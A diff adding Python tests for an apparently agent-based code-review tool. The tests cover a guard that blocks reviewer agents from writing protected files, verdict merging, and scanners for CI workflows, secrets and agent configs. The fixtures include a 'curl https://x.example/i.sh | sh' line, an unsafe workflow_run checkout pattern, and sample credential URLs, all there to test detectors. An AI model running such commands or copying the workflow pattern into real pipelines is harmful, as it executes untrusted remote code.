@@ -161,3 +161,91 @@ def _(d):
     M = _cfg10()("critic_merge")
     assert sorted([{"verdict": "refuted", "reproduced": "executed"}, {"verdict": "unclear", "reproduced": "no"}], key=M.verdict_rank)[0]["verdict"] == "refuted"
     assert sorted([{"verdict": "refuted", "reproduced": "executed"}, {"verdict": "confirmed", "reproduced": "executed"}], key=M.verdict_rank)[0]["verdict"] == "confirmed"
+
+@test("5.8.1 blind round C1 and C2: a reviewer's Write can't touch the briefs or the scan, and a protected name in other letter case is still protected")
+def _(d):
+    p = d / "proj"; write(p, "src/app.js", "x\n"); (p / ".critic").mkdir(exist_ok=True)
+    deny = lambda rel, role="reviewer": "deny" in run(H / "guard_state.py", cwd=p, stdin=json.dumps({"tool_name": "Write", "tool_input": {"file_path": str(p / rel), "content": "{}"}, "cwd": str(p), "agent_type": f"curmudgeon:curmudgeon-{role}", "agent_id": "r1", "hook_event_name": "PreToolUse"})).stdout
+    for rel in (".critic/briefs/brief-B.md", ".critic/scan/report.json", ".critic/Proctor/marks.json", ".critic/PLAN.json", ".critic/Stops/x.json", ".Critic/proctor/marks.json", ".critic/Scratch/other/notes/a.txt"):
+        assert deny(rel), rel
+    assert not deny(".critic/reviews/review-B.json") and not deny(".critic/scratch/r1/notes/a.txt"), "its own review and notes stay writable"
+
+@test("5.8.1 blind round C3: a verdict the merge's rules would reject never displaces a second verdict they accept")
+def _(d):
+    write(d, "src/app.js", APP); run(S / "critic_ledger.py", "start", "review", "--tier", "full", cwd=d)
+    _tally3(d, [finding(impact="High")], [finding(impact="High")], [])
+    ids = [p.stem for p in (d / ".critic/verify").glob("*.json")]; assert ids
+    weak = [{"id": i, "verdict": "refuted", "reproduced": "executed", "refutation": "not a bug"} for i in ids]
+    conf = [{"id": i, "verdict": "confirmed", "reproduced": "traced", "entry": "render() runs on load", "path": ["src/app.js:2 writes the title as HTML"]} for i in ids]
+    a = hook_verdicts(d, weak, "w1"); b = hook_verdicts(d, conf, "w2")
+    r = run(S / "critic_merge.py", "apply", str(a), str(b), cwd=d); assert r.returncode == 0, r.stderr[-400:]
+    f = [json.loads(x) for x in (d / ".critic/findings.jsonl").read_text(encoding="utf-8").splitlines() if x.strip()]
+    assert [x["verifier"] for x in f] == ["confirmed"], f
+    M = _cfg10()("critic_merge")
+    rank = lambda *vs: sorted(vs, key=M.verdict_rank)[0]["verdict"]
+    assert rank({"verdict": "unclear", "reproduced": "no"}, {"verdict": "refuted", "reproduced": "traced"}) == "refuted", "a trace beats no run"
+    assert rank({"verdict": "refuted", "reproduced": "traced"}, {"verdict": "unclear", "reproduced": "traced"}) == "unclear", "equal evidence: the one that keeps it"
+    assert rank({"verdict": "unclear", "reproduced": "traced"}, {"verdict": "downgrade", "reproduced": "traced"}) == "downgrade"
+    assert rank({"verdict": "downgrade", "reproduced": "executed"}, {"verdict": "confirmed", "reproduced": "executed"}) == "confirmed"
+
+@test("5.8.1 blind round C4: !cancelled() beside a same-repository guard keeps the exemption; negating the guard itself still removes it")
+def _(d):
+    C = _cfg10()("scan_ci")
+    wr = ("on:\n  workflow_run:\n    workflows: [CI]\n    types: [completed]\npermissions:\n  contents: read\njobs:\n  deploy:\n    if: {guard}\n    runs-on: ubuntu-latest\n    steps:\n"
+          "      - uses: actions/checkout@v4\n        with:\n          ref: ${{{{ github.event.workflow_run.head_sha }}}}\n      - run: ./deploy.sh\n")
+    rules = lambda g: [r for _, r, _ in _rows(C.scan_workflow, ".github/workflows/x.yml", wr.format(guard=g))]
+    assert "ci-pwn-request" not in rules("github.event.workflow_run.event == 'push' && !cancelled()")
+    assert "ci-pwn-request" in rules("always() && !(github.event.workflow_run.event == 'push')")
+
+@test("5.8.1 blind round C5: a well-known password on a real server is FAIL; only a local, container or example host makes it WARN")
+def _(d):
+    ss = _cfg10()("scan_secrets")
+    def lv(u):
+        rows = []; ss.scan(".env", "DB=" + u + "\n", lambda *a: rows.append(a)); return [r[0] for r in rows if r[1] == "secret-db-url-password"]
+    for u in ("postgres://app:password@db.prod.example.co/x", "postgres://admin:admin@10.0.0.5/x"): assert lv(u) == ["FAIL"], (u, lv(u))
+    for u in ("postgres://postgres:postgres@localhost/dev", "postgres://postgres:postgres@db:5432/x", "mysql://root:root@[::1]:3306/x", "postgres://u:password@db.example.com/x"): assert lv(u) == ["WARN"], (u, lv(u))
+
+@test("5.8.1 blind round L1 and L2: a short default is no credential, and ${A:?}literal${B:?} is not one reference")
+def _(d):
+    ac = _cfg10()("scan_agentcfg")
+    def fails(v):
+        rows = []; ac.scan(".mcp.json", json.dumps({"mcpServers": {"x": {"command": "node", "args": ["s.js"], "env": {"API_TOKEN": v}}}}), lambda *a: rows.append(a), {})
+        return [r for r in rows if r[1] == "agent-literal-credential"]
+    assert not fails("${API_TOKEN:-ab}")
+    assert fails("${A:?}sk_live_placeholder_Zq8vLx${B:?}")
+
+@test("5.8.1 blind round L3, L4, L8: equal short quotes far apart stay two findings; a quoted value with a comma before the blank line is refused; curl | sh is reported at the real line, not a commented copy")
+def _(d):
+    cf = _cfg10()("critic_findings"); Y = _cfg10()("yaml_lite"); C = _cfg10()("scan_ci")
+    a = {"file": "src/app.js", "line": 10, "category": "security", "title": "User title rendered as HTML", "quote": "el.innerHTML = t;"}
+    assert not cf.similar(a, dict(a, line=300)), "a short quote can repeat at two sites"
+    try: Y.loads('a: [x, "foo,\n\n  bar"]\n'); assert False, "read"
+    except Y.Refused: pass
+    wf = "on: push\npermissions: read-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          # curl https://x.example/i.sh | sh\n          curl https://x.example/i.sh | sh\n"
+    assert [w for _, r, w in _rows(C.scan_workflow, ".github/workflows/x.yml", wf) if r == "curl-pipe-shell"] == [".github/workflows/x.yml:9"]
+
+@test("5.8.1 blind round L7: a stop record from before this run started never orders this run's reviewers")
+def _(d):
+    import importlib
+    sys.path.insert(0, str(HERE / "hooks")); C = importlib.import_module("check_contract"); P = importlib.import_module("proctor")
+    own_ledger(d, {"started_at": 1000.0})
+    C.write_stop(d, "old", {"review": "review-B.json", "at": 500.0}); C.write_stop(d, "new", {"review": "review-A.json", "at": 1100.0})
+    assert P._stop_order(str(d)) == {"review-A.json": 1100.0}, P._stop_order(str(d))
+
+@test("5.8.1 blind round: a command that only mentions its own review's name (a test it runs) still shows the reviewer its output, so honest text from it is not flagged")
+def _(d):
+    import importlib
+    sys.path.insert(0, str(HERE / "hooks")); P = importlib.import_module("proctor")
+    write(d, "src/app.js", APP)
+    run(S / "critic_run.py", "begin", "--files", "src/app.js", "--tier", "full", cwd=d)
+    b = {x: (d / f".critic/briefs/brief-{x}.md").read_text(encoding="utf-8") for x in "AB"}
+    odd = "the discount stack silently compounds when two coupons share a single redemption code"
+    write(d, ".critic/reviews/review-A.json", json.dumps([dict(TAX9, evidence=TAX9["evidence"] + "; " + odd)]))
+    _stop9(d, "c3c", "A", [b["A"]]); time.sleep(1.1)
+    write(d, ".critic/reviews/review-B.json", json.dumps([dict(TAX9, title="Coupons", evidence="so " + odd + " here", failing_case="two coupons", remediation="cap")]))
+    tr = d / ".critic" / "t-bash.jsonl"
+    tr.write_text("\n".join(json.dumps(x) for x in (
+        {"message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "r0", "content": b["B"]}]}},
+        {"message": {"role": "assistant", "content": [{"type": "tool_use", "id": "b1", "name": "Bash", "input": {"command": "python3 probe.py --review review-B.json"}}]}},
+        {"message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "b1", "content": "probe printed: " + odd}]}})) + "\n", encoding="utf-8")
+    assert P.check(str(d), str(tr), "review-B.json")["copied"] == [], "its own program's output was shown to it"
